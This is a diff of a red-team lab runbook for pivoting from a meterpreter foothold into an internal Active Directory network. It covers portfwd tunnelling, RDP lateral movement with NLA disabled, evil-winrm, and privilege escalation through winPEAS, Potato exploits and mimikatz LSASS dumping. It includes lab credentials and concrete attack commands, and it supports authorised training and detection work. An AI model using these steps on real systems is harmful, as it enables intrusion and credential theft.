@@ -1,25 +1,28 @@
-# Phase 6 — Keys of the Gods (Pivot + Lateral Movement)
+# Phases 5–6 — Breach of Hades (Pivot + Lateral) · Keys of the Gods (Escalation)
 
 > ISOLATED LAB ONLY. Authorised assessment. Host-only network.
 
 Runbook for moving from the gatehouse foothold into the internal network and
 escalating. Chosen approach: **meterpreter `portfwd`** for the pivot (runs over the
-existing C2 session from Phase 5 — no SSH credential needed) + **RDP as `persephone`**
+existing C2 session from the Apache CVE exploitation — no SSH credential needed) + **RDP as `persephone`**
 for lateral access.
+
+> **Step → Stage map:** Steps 1-4 = **Stage 5 (Breach of Hades)** — pivot + RDP lateral. Step 5 = **Stage 6 (Keys of the Gods)** — privilege escalation. Step 6 is the blue-team mapping for both.
 
 ## Where we start
 
 ```
 Kali (attacker)
   │  foothold: meterpreter session on the gatehouse
-  │  (Phase 5: apache_normalize_path_rce -> linux/x64/meterpreter/reverse_tcp)
+  │  (Apache CVE exploit: apache_normalize_path_rce -> linux/x64/meterpreter/reverse_tcp)
   ▼
-Gatehouse 10.1.1.10  (Ubuntu, DUAL-HOMED: DMZ 10.1.1.x + internal 192.168.1.x)
+gatehouse 10.1.1.10 [IP varies by env: .10/.5]  (Ubuntu, DUAL-HOMED: DMZ 10.1.1.x + internal 192.168.1.x)
   ▼
-Internal 192.168.1.0/24
-  - DC            192.168.1.100   (hades.underworld)
-  - Workstation   192.168.1.103   (domain-joined, Blue Team / victim)
-  - Splunk        192.168.1.6
+Internal 192.168.1.0/24   (IPs vary by environment)
+  - olympus-dc     (target DC, olympus.net)          e.g. 192.168.1.100
+  - hades-dc       (email server, hades.underworld)  — separate, not attacked here
+  - persephone-ws  (joined to olympus.net)           e.g. 192.168.1.103
+  - splunk                                           e.g. 192.168.1.6
 ```
 
 AD creds (from phishing `persephone`): `persephone / Demeter01!` — **normal** domain
@@ -27,7 +30,7 @@ user, authorised for RDP on .103. Other wardens share `Ferryman1!`: `charon`,
 `cerberus`, `minos`, `hades`. No warden is a domain admin → escalation is local on the
 workstation (or promote `hades` to Domain Admin later).
 
-> **Why `portfwd`, not `ssh -D`.** Phase 5 lands a **meterpreter** session, not an SSH
+> **Why `portfwd`, not `ssh -D`.** Phase 4 lands a **meterpreter** session, not an SSH
 > login, so we tunnel over the C2 we already have — no need to find or crack an SSH
 > credential on the gatehouse. It is also quieter there: no `auth.log` login line, just
 > the existing session (see `docs/blue-team-detection.md` §6).
@@ -41,23 +44,39 @@ Do this at the VM console, not over the pivot.
 1. Build a Windows 10/11 VM on the **internal** vSwitch (192.168.1.0/24).
 2. Point DNS at the DC (required for domain discovery) and set the static IP:
    ```powershell
-   Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses 192.168.1.100
+   Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses 192.168.1.100   # olympus-dc
    New-NetIPAddress -InterfaceAlias "Ethernet" -IPAddress 192.168.1.103 -PrefixLength 24 -DefaultGateway 192.168.1.1
    ```
 3. Join the domain (use an account allowed to join, e.g. `hades`):
    ```powershell
-   Add-Computer -DomainName "hades.underworld" -Credential (Get-Credential) -Restart
+   Add-Computer -DomainName "olympus.net" -Credential (Get-Credential) -Restart
    ```
-4. After reboot, log in once as `HADES\persephone` so the user profile is created.
-5. Enable RDP and authorise `persephone`:
+4. After reboot, log in once as `OLYMPUS\persephone` so the user profile is created.
+5. Enable RDP, **disable NLA**, and authorise `persephone`:
    ```powershell
+   # enable RDP
    Set-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0
+   # RDP service: automatic + started (otherwise 3389 may not be listening at all)
+   Set-Service TermService -StartupType Automatic; Start-Service TermService
+   # firewall
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
-   Add-LocalGroupMember -Group "Remote Desktop Users" -Member "HADES\persephone"
+   # disable NLA — lets a non-domain Kali authenticate without Kerberos (see Step 4)
+   Set-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name UserAuthentication -Value 0
+   # authorise persephone for RDP
+   Add-LocalGroupMember -Group "Remote Desktop Users" -Member "OLYMPUS\persephone"
+   #   if that throws "Object reference not set..." (known bug with domain accounts), use:
+   #   net localgroup "Remote Desktop Users" "OLYMPUS\persephone" /add
    ```
-> **Gotcha:** if the network profile is **Public**, the firewall drops the pivot's
-> traffic to `filtered`. Fix it:
-> `Set-NetConnectionProfile -InterfaceAlias "Ethernet" -NetworkCategory Private`.
+   Verify it is actually listening: `Get-NetTCPConnection -LocalPort 3389 -State Listen`.
+
+   > `windows/setup-workstation.ps1` scripts this whole RDP-enable step (idempotent) — run it on the ws instead of the commands above.
+> **Gotchas:**
+> - If the gatehouse's `timeout 1 bash -c 'echo > /dev/tcp/<ws>/3389'` test returns
+>   **CLOSED**, RDP isn't listening or the firewall is blocking it — fix on the
+>   **workstation** (service + firewall rule above), not the tunnel.
+> - If the network profile is **Public**, the firewall drops RDP to `filtered`:
+>   `Set-NetConnectionProfile -InterfaceAlias "Ethernet" -NetworkCategory Private`
+>   (a domain-joined box usually shows `DomainAuthenticated`, which is fine).
 
 ## Step 2 — Internal recon from the foothold  (meterpreter -> `shell` on the gatehouse)
 
@@ -108,12 +127,20 @@ Manage forwards with `portfwd list` and
 Point the RDP client at **your own Kali** (the local forward), not at the workstation IP:
 
 ```bash
-xfreerdp3 /u:persephone /d:hades.underworld /p:'Demeter01!' \
-  /v:127.0.0.1:13389 /cert:ignore +clipboard /dynamic-resolution
+xfreerdp3 /u:persephone /d:olympus.net /p:'Demeter01!' \
+  /v:127.0.0.1:13389 /cert:ignore +clipboard /dynamic-resolution /sec:tls
 ```
 (On Kali the binary is `xfreerdp3`, FreeRDP v3. WinRM alternative while you have the
 cred, if 5985 is forwarded the same way with another `portfwd add -l 15985 -p 5985 -r 192.168.1.103`:
 `evil-winrm -i 127.0.0.1 -P 15985 -u persephone -p 'Demeter01!'`.)
+
+> **Why `/sec:tls` (+ NLA disabled on the ws in Step 1).** From a non-domain Kali you
+> can't reach the KDC through the portfwd, and Kerberos over a `127.0.0.1` forward also
+> breaks on SPN / clock-skew — so the default NLA handshake (which prefers Kerberos)
+> hangs with *"Cannot find KDC for realm"*. Disabling NLA on the workstation and forcing
+> `/sec:tls` skips that and authenticates in-session. NTLM would work in principle, but
+> FreeRDP3 did not fall back to it reliably. NLA-off RDP is itself a realistic finding —
+> document it as a deliberate weakness for the report.
 
 ## Step 5 — Local privilege escalation on the workstation
 
@@ -129,7 +156,7 @@ reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 - Run **winPEAS** for unquoted service paths, writable service binaries, scheduled
   tasks, stored creds.
 - If `SeImpersonatePrivilege` is present → PrintSpoofer / GodPotato.
-- Once local admin → dump cached creds (LSASS/mimikatz) and move toward the DC with the
+- Once local admin → dump cached creds (LSASS/mimikatz) and move toward **olympus-dc** (the target) with the
   `hades` credential via PsExec/WinRM.
 
 ## Step 6 — Blue team / Splunk detection mapping
